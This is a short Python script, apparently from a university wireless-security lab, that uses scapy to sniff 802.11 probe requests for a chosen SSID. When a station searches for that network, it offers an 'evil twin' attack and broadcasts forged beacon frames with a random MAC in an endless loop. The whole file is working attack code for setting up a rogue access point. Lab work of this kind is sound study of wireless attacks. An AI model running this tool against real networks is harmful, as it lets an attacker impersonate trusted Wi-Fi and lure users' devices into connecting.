#!/usr/bin/env python
'''
SWI - Labo1
Auteurs : Nemanja Pantic et David Simeonovic
But : Permet de detecter une STA cherchant un SSID particulier et proposer un evil twin si le SSID est trouvé
'''

from scapy.all import *
import random


#Filtre les paquets pour n'avoir que les probe request et affiche le résultat 
def pkt_callback(pkt):
    if pkt.haslayer(Dot11ProbeReq):
        if pkt.info.decode() == ssid_find :
            print("STA (%s) looking for the given SSID" % (pkt.addr2))
            response = input("Do you want to perform an evil twin attack (yes or no): ")
            if response == "yes":
                evilTwinAttack(pkt)
            else :
                return

def evilTwinAttack(pkt):
    # Récupération du SSID du wifi choisi par l'utilisateur
    fakeSSID = pkt[Dot11Elt].info.decode()

    #Création d'une adresse MAC fictive
    fakeMac = RandMAC()

    #Création du paquet à envoyé
    fakePkt = RadioTap() / Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF",addr2=fakeMac, addr3=fakeMac) / Dot11Beacon() / Dot11Elt(ID= "SSID", info=ssid_find)

    # Envoie du nouveau paquet en boucle
    print("Fake AP {0} created".format(fakeSSID))
    sendp(fakePkt, iface=interface, inter=0.1, loop=1)


#Demande le ssid et l'interface à l'utilisateur
ssid_find = input("Select the SSID that you want to chase :")
interface = input("Put your interface name : ")

#Sniff les réseaux wifi
sniff(iface=interface, prn=pkt_callback, monitor=True)